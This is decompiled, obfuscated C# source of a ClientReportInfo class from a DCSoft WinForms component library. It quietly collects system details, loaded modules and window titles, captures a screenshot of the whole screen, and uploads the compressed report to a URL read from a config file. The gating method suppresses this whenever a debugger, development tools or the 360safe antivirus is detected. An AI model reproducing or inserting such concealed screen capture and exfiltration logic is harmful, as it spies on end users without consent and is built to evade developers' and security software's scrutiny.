using DCSoft.Common;
using DCSoftDotfuscate;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using System.Xml.Serialization;

namespace DCSoft.WinForms
{
	[ComVisible(false)]
	public class ClientReportInfo
	{
		private static int int_0 = 0;

		private static int int_1 = 0;

		private string string_0 = null;

		private DateTime dateTime_0 = DateTime.Now;

		private string string_1 = null;

		private int int_2 = 1;

		private string string_2 = null;

		private string string_3 = Environment.MachineName;

		private string string_4 = Environment.OSVersion.ToString();

		private string string_5 = Environment.Version.ToString();

		private string string_6 = null;

		private string string_7 = Application.ExecutablePath;

		private string string_8 = Application.ProductName;

		private string string_9 = Application.ProductVersion;

		private string string_10 = Application.CompanyName;

		private string string_11 = Application.CurrentCulture.ToString();

		private string string_12 = SystemInformation.ComputerName;

		private string string_13 = null;

		private List<ClientProcessModuleInfo> list_0 = null;

		private List<ClientFormInfo> list_1 = null;

		private List<ClientFormInfo> list_2 = null;

		private string string_14 = Screen.PrimaryScreen.Bounds.Width + "*" + Screen.PrimaryScreen.Bounds.Height;

		private string string_15 = null;

		private string string_16 = null;

		private string string_17 = null;

		private string string_18 = null;

		private string string_19 = null;

		private string string_20 = null;

		private static Dictionary<string, string> dictionary_0 = new Dictionary<string, string>();

		/// <summary>
		///       编号
		///       </summary>
		[XmlAttribute]
		public string ID
		{
			get
			{
				return string_0;
			}
			set
			{
				string_0 = value;
			}
		}

		/// <summary>
		///       报告时间
		///       </summary>
		[XmlElement]
		public DateTime ReportTime
		{
			get
			{
				return dateTime_0;
			}
			set
			{
				dateTime_0 = value;
			}
		}

		/// <summary>
		///       报告类型
		///       </summary>
		[XmlElement]
		public string ReportType
		{
			get
			{
				return string_1;
			}
			set
			{
				string_1 = value;
			}
		}

		/// <summary>
		///       报告版本号
		///       </summary>
		[XmlAttribute]
		public int ReportVersion
		{
			get
			{
				return int_2;
			}
			set
			{
				int_2 = value;
			}
		}

		/// <summary>
		///       相关的注册码
		///       </summary>
		[XmlElement]
		[DefaultValue(null)]
		public string RegisterCode
		{
			get
			{
				return string_2;
			}
			set
			{
				string_2 = value;
			}
		}

		[XmlElement]
		public string MachineName
		{
			get
			{
				return string_3;
			}
			set
			{
				string_3 = value;
			}
		}

		[XmlElement]
		public string OSVersion
		{
			get
			{
				return string_4;
			}
			set
			{
				string_4 = value;
			}
		}

		[XmlElement]
		public string RuntimeVersion
		{
			get
			{
				return string_5;
			}
			set
			{
				string_5 = value;
			}
		}

		/// <summary>
		///       用户名
		///       </summary>
		[XmlElement]
		public string UserName
		{
			get
			{
				return string_6;
			}
			set
			{
				string_6 = value;
			}
		}

		[XmlElement]
		public string ExecutablePath
		{
			get
			{
				return string_7;
			}
			set
			{
				string_7 = value;
			}
		}

		[XmlElement]
		public string ProductName
		{
			get
			{
				return string_8;
			}
			set
			{
				string_8 = value;
			}
		}

		[XmlElement]
		public string ProductVersion
		{
			get
			{
				return string_9;
			}
			set
			{
				string_9 = value;
			}
		}

		[XmlElement]
		public string CompanyName
		{
			get
			{
				return string_10;
			}
			set
			{
				string_10 = value;
			}
		}

		[XmlElement]
		public string CurrentCulture
		{
			get
			{
				return string_11;
			}
			set
			{
				string_11 = value;
			}
		}

		[XmlElement]
		public string ComputerName
		{
			get
			{
				return string_12;
			}
			set
			{
				string_12 = value;
			}
		}

		[XmlElement]
		public string ProcessTitle
		{
			get
			{
				return string_13;
			}
			set
			{
				string_13 = value;
			}
		}

		[XmlArrayItem("Module", typeof(ClientProcessModuleInfo))]
		public List<ClientProcessModuleInfo> Modules
		{
			get
			{
				return list_0;
			}
			set
			{
				list_0 = value;
			}
		}

		[XmlArrayItem("Form", typeof(ClientFormInfo))]
		public List<ClientFormInfo> Forms
		{
			get
			{
				return list_1;
			}
			set
			{
				list_1 = value;
			}
		}

		[XmlArrayItem("Form", typeof(ClientFormInfo))]
		public List<ClientFormInfo> GlobalForms
		{
			get
			{
				return list_2;
			}
			set
			{
				list_2 = value;
			}
		}

		[XmlElement]
		public string ScreenSize
		{
			get
			{
				return string_14;
			}
			set
			{
				string_14 = value;
			}
		}

		[XmlElement]
		public string MainAssemblyName
		{
			get
			{
				return string_15;
			}
			set
			{
				string_15 = value;
			}
		}

		[XmlElement]
		public string MainFileName
		{
			get
			{
				return string_16;
			}
			set
			{
				string_16 = value;
			}
		}

		[XmlElement]
		public string MainVersion
		{
			get
			{
				return string_17;
			}
			set
			{
				string_17 = value;
			}
		}

		[XmlElement]
		public string CoreVersion
		{
			get
			{
				return string_18;
			}
			set
			{
				string_18 = value;
			}
		}

		[XmlElement]
		public string ControlLayers
		{
			get
			{
				return string_19;
			}
			set
			{
				string_19 = value;
			}
		}

		[XmlElement]
		public string ScreenSnapshort
		{
			get
			{
				return string_20;
			}
			set
			{
				string_20 = value;
			}
		}

		private static bool smethod_0(string string_21)
		{
			int num = 10;
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\" + string_21, writable: false);
			if (registryKey != null)
			{
				registryKey.Close();
				return true;
			}
			registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\" + string_21, writable: false);
			if (registryKey != null)
			{
				registryKey.Close();
				return true;
			}
			return false;
		}

		public static bool smethod_1()
		{
			int num = 3;
			if (Environment.TickCount < 60000)
			{
				return false;
			}
			if (int_0++ != 30)
			{
				return false;
			}
			if (!SystemInformation.Network)
			{
				return false;
			}
			if (Debugger.IsAttached || Debugger.IsLogging())
			{
				return false;
			}
			if (int_1 == 0)
			{
				if (smethod_0("Microsoft\\VisualStudio\\Debugger\\JIT") || smethod_0("Microsoft\\VisualStudio\\Debugger\\JIT") || smethod_0("Borland\\C++Builder") || smethod_0("Borland\\Delphi") || smethod_0("Embarcadero\\BDS") || smethod_0("CodeGear\\BDS") || smethod_0("Microsoft\\VisualStudio\\6.0"))
				{
					int_1 = -1;
					return false;
				}
				int_1 = 1;
			}
			try
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					try
					{
						string processName = process.ProcessName;
						if (processName != null && (processName.IndexOf("devenv", StringComparison.CurrentCultureIgnoreCase) >= 0 || processName.IndexOf("delphi", StringComparison.CurrentCultureIgnoreCase) >= 0 || processName.IndexOf("pb", StringComparison.CurrentCultureIgnoreCase) >= 0 || processName.IndexOf("360safe", StringComparison.CurrentCultureIgnoreCase) >= 0))
						{
							return false;
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
			return true;
		}

		/// <summary>
		///       初始化对象
		///       </summary>
		public ClientReportInfo()
		{
			try
			{
				Process currentProcess = Process.GetCurrentProcess();
				if (currentProcess != null)
				{
					ProcessTitle = currentProcess.MainWindowTitle;
					if (currentProcess.Modules != null)
					{
						Modules = new List<ClientProcessModuleInfo>();
						foreach (ProcessModule module in currentProcess.Modules)
						{
							ClientProcessModuleInfo clientProcessModuleInfo = new ClientProcessModuleInfo
							{
								Name = module.ModuleName,
								FileName = module.FileName
							};
							if (module.FileVersionInfo != null)
							{
								clientProcessModuleInfo.Version = module.FileVersionInfo.FileVersion.ToString();
							}
							Modules.Add(clientProcessModuleInfo);
						}
						Modules.Sort();
					}
				}
			}
			catch (Exception)
			{
			}
			if (Application.OpenForms != null)
			{
				Forms = new List<ClientFormInfo>();
				foreach (Form openForm in Application.OpenForms)
				{
					ClientFormInfo item = new ClientFormInfo
					{
						Name = openForm.Name,
						TypeName = openForm.GetType().FullName,
						Text = openForm.Text
					};
					Forms.Add(item);
				}
				Forms.Sort();
			}
			try
			{
				GlobalForms = new List<ClientFormInfo>();
				GClass244[] array = GClass244.smethod_6();
				foreach (GClass244 gClass in array)
				{
					ClientFormInfo item2 = new ClientFormInfo
					{
						Text = gClass.method_3(),
						Name = gClass.method_2()
					};
					GlobalForms.Add(item2);
				}
				GlobalForms.Sort();
			}
			catch (Exception)
			{
			}
		}

		public bool method_0()
		{
			int num = 11;
			try
			{
				if (Environment.UserInteractive)
				{
					Rectangle bounds = Screen.PrimaryScreen.Bounds;
					using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
					{
						using (Graphics graphics = Graphics.FromImage(bitmap))
						{
							graphics.CopyFromScreen(0, 0, 0, 0, bounds.Size);
						}
						ImageCodecInfo imageCodecInfo = smethod_2("image/jpeg");
						if (imageCodecInfo != null)
						{
							EncoderParameters encoderParameters = new EncoderParameters(1);
							encoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 10L);
							MemoryStream memoryStream = new MemoryStream();
							bitmap.Save(memoryStream, imageCodecInfo, encoderParameters);
							memoryStream.Close();
							string_20 = Convert.ToBase64String(memoryStream.ToArray());
						}
					}
					return true;
				}
			}
			catch (Exception)
			{
			}
			return false;
		}

		private static ImageCodecInfo smethod_2(string string_21)
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			int num = 0;
			while (true)
			{
				if (num < imageEncoders.Length)
				{
					if (imageEncoders[num].MimeType == string_21)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			return imageEncoders[num];
		}

		public void method_1(Control control_0)
		{
			int num = 5;
			try
			{
				string_19 = null;
				StringBuilder stringBuilder = new StringBuilder();
				for (Control control = control_0; control != null; control = control.Parent)
				{
					if (!control.IsDisposed)
					{
						string text = control.Text;
						if (text != null && text.Length > 100)
						{
							text = text.Substring(0, 99);
						}
						if (text != null)
						{
							text = StringCommon.CompressWhiteSpace(text);
						}
						stringBuilder.AppendLine(control.GetType().FullName + ":" + control.Name + "=" + text);
					}
				}
				ControlLayers = stringBuilder.ToString();
			}
			catch (Exception)
			{
			}
		}

		public void method_2(Assembly assembly_0)
		{
			if (assembly_0 != null)
			{
				string_15 = assembly_0.FullName;
				string_16 = assembly_0.Location;
				string_17 = assembly_0.GetName().Version.ToString();
			}
		}

		public string method_3(bool bool_0)
		{
			if (bool_0)
			{
				return XMLHelper.SaveObjectToIndentXMLString(this);
			}
			return XMLHelper.SaveObjectToXMLString(this);
		}

		public bool method_4(string string_21)
		{
			int num = 10;
			if (string_21 == null || string_21.Length == 0)
			{
				return false;
			}
			string text = null;
			if (dictionary_0.ContainsKey(string_21))
			{
				text = dictionary_0[string_21];
			}
			else
			{
				try
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(string_21);
					XmlElement xmlElement = (XmlElement)xmlDocument.DocumentElement.SelectSingleNode("ReportServerPage");
					if (xmlElement != null)
					{
						text = xmlElement.InnerText;
						if (text != null && text.Length > 0)
						{
							dictionary_0[string_21] = text;
						}
					}
				}
				catch (Exception)
				{
				}
			}
			if (text != null && text.Length > 0)
			{
				try
				{
					WebClient webClient = new WebClient();
					string s = method_3(bool_0: false);
					byte[] bytes = Encoding.UTF8.GetBytes(s);
					bytes = FileHelper.GZipCompress(bytes);
					webClient.UploadDataAsync(new Uri(text), bytes);
					return true;
				}
				catch (Exception)
				{
				}
			}
			return false;
		}
	}
}
